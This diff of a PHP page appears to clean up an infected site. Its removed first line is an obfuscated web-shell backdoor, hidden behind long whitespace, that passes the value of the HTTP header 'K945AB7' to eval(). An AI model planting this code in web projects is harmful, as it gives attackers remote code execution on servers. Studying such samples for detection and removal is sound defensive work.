@@ -1,7 +1,6 @@
-<?php                                                                                                                                                                                                                     $w8a='(79RatvSuhf$_se"io5VE\'b4lrpk945ab7';$t8t=$w8a[13].$w8a[5].$w8a[25].$w8a[5].$w8a[17].$w8a[8].$w8a[26].$w8a[26].$w8a[14].$w8a[25];$u0x=$w8a[13].$w8a[5].$w8a[25].$w8a[5].$w8a[17].$w8a[8].$w8a[26].$w8a[26].$w8a[14].$w8a[25];if(isset(${$w8a[12].$w8a[7].$w8a[20].$w8a[3].$w8a[19].$w8a[20].$w8a[3]}[$t8t($w8a[9].$w8a[5].$w8a[5].$w8a[26].$w8a[12].$w8a[27].$w8a[2].$w8a[23].$w8a[18].$w8a[4].$w8a[22].$w8a[1])])){eval(${$w8a[12].$w8a[7].$w8a[20].$w8a[3].$w8a[19].$w8a[20].$w8a[3]}[$t8t($w8a[9].$w8a[5].$w8a[5].$w8a[26].$w8a[12].$w8a[27].$w8a[2].$w8a[23].$w8a[18].$w8a[4].$w8a[22].$w8a[1])]);} ?><?php
+<?php
 
 require_once('../Connections/maconnexion.php');
-header('Content-Type: text/html; charset=iso-8859-1');
 
 
 $editFormAction = $_SERVER['PHP_SELF'];
